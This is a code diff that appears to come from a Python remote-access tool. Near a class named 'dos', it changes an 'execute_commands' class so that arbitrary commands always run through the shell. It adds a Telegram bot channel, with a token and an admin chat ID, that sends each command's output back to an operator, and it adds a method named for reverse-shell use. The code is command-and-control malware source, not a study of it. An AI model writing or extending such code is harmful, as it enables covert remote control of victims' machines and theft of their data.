@@ -93,24 +93,43 @@ class dos:
             
             
 class execute_commands:
-
-    def __init__(self,command,timeout=120):
+    def __init__(self,command,ADMIN_CHAT_ID,TELEGRAM_TOKEN,logger,timeout=5):
         self.command = command
+        self.ADMIN_CHAT_ID = ADMIN_CHAT_ID
+        self.TELEGRAM_TOKEN = TELEGRAM_TOKEN
+        self.logger = logger
+        self.timeout = timeout
+
+    def send_message(self,text: str):
+        send_message_by_third_party_proxy(
+            text, TELEGRAM_TOKEN=self.TELEGRAM_TOKEN,
+            ADMIN_CHAT_ID=self.ADMIN_CHAT_ID, logger=self.logger)
+
+    def clean_shell_data(self,output):
+        output = str(output).replace('\\r\\n', '\n')  # cleaning data
+        output = str(output).replace('\\n', '\n')
+        output = str(output).replace("b'", '')
+        return output
+
     def runcommand(self):
         try:
-            result = subprocess.check_output(self.command, shell=False, timeout=self.timeout)
-        except FileNotFoundError:
-            try:
-                result = subprocess.check_output(self.command, shell=True, timeout=self.timeout)
-            except TimeoutExpired:
-                result = "TimeOut!"
+            result = subprocess.check_output(self.command, shell=True, timeout=self.timeout)
+        except TimeoutExpired:
+            result = "TimeOut!"
+
+        self.send_message(f"""RE: {self.command}
+        Results: {self.clean_shell_data(result)}""")
+        return 0
 
 
+    def runcommand_for_reverse_shell(self):
+        # Is shell ?
+        try:
+            result = subprocess.check_output(self.command, shell=True)
+        except TimeoutExpired:
+            result = "TimeOut!"
 
-
-
-        
-
+        return result
 
 
 def get_current_epoc_time() -> float:
